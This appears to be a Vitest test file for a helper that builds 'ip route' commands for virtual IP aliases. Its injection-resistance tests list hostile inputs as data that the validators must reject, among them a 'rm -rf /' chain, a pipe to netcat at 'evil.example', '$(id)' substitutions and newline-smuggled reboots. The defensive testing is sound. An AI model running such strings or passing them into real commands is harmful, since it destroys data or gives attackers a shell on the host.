import { describe, expect, it } from "vitest";
import {
  assertInterfaceName,
  assertIpv4Literal,
  buildVirtualIpRouteCommand,
} from "../src/ipAlias";

const SHIM = "macvlan-shim0";

describe("buildVirtualIpRouteCommand", () => {
  it("produces exactly the command a user verified by hand in #15", () => {
    expect(buildVirtualIpRouteCommand("192.168.1.250", SHIM, "add")).toBe(
      `ip route replace 192.168.1.250/32 dev ${SHIM}`,
    );
  });

  it("uses 'replace' rather than 'add' so it is idempotent across restarts", () => {
    // `ip route add` fails with EEXIST on the second call; proxies are
    // recreated on every plugin reload, so this has to be re-runnable.
    expect(buildVirtualIpRouteCommand("10.0.0.5", SHIM, "add")).toContain(
      "route replace",
    );
  });

  it("tolerates an already-absent route when removing", () => {
    expect(buildVirtualIpRouteCommand("192.168.1.250", SHIM, "remove")).toBe(
      `ip route del 192.168.1.250/32 dev ${SHIM} 2>/dev/null || true`,
    );
  });

  it("always scopes the route to a single host", () => {
    // A /24 here would hijack the whole subnet on the host and break every
    // other device on the LAN, so the mask must never widen.
    expect(buildVirtualIpRouteCommand("192.168.1.250", SHIM, "add")).toContain(
      "/32",
    );
  });
});

describe("command-injection resistance", () => {
  // These strings are interpolated into a shell command executed inside a
  // PRIVILEGED container with the host network namespace, so a bad IP is a
  // host-level RCE rather than a formatting bug.
  const MALICIOUS = [
    "192.168.1.1; rm -rf /",
    "192.168.1.1 && reboot",
    "192.168.1.1|nc evil.example 1",
    "$(id)",
    "`id`",
    "192.168.1.1\nreboot",
  ];

  it.each(MALICIOUS)("rejects injected IP %j", (ip) => {
    expect(() => assertIpv4Literal(ip)).toThrow(/Invalid IPv4/);
    expect(() => buildVirtualIpRouteCommand(ip, SHIM, "add")).toThrow();
  });

  it.each(["eth0; reboot", "$(id)", "et|h0", "eth 0"])(
    "rejects injected interface name %j",
    (iface) => {
      expect(() => assertInterfaceName(iface)).toThrow(/Invalid interface/);
      expect(() =>
        buildVirtualIpRouteCommand("192.168.1.250", iface, "add"),
      ).toThrow();
    },
  );
});

describe("assertIpv4Literal", () => {
  it.each(["192.168.1.250", "10.0.0.1", "255.255.255.255", "0.0.0.0"])(
    "accepts %s",
    (ip) => expect(assertIpv4Literal(ip)).toBe(ip),
  );

  it.each(["192.168.1.256", "1.2.3", "1.2.3.4.5", "", "   ", "::1", "abc"])(
    "rejects %j",
    (ip) => expect(() => assertIpv4Literal(ip)).toThrow(),
  );
});

describe("assertInterfaceName", () => {
  it.each([SHIM, "eth0", "br-1a2b3c", "en_0"])("accepts %s", (i) =>
    expect(assertInterfaceName(i)).toBe(i),
  );

  it("rejects names beyond the Linux 15-character limit", () => {
    expect(() => assertInterfaceName("a".repeat(16))).toThrow();
    expect(assertInterfaceName("a".repeat(15))).toHaveLength(15);
  });

  it("rejects an empty name", () => {
    expect(() => assertInterfaceName("")).toThrow();
  });
});
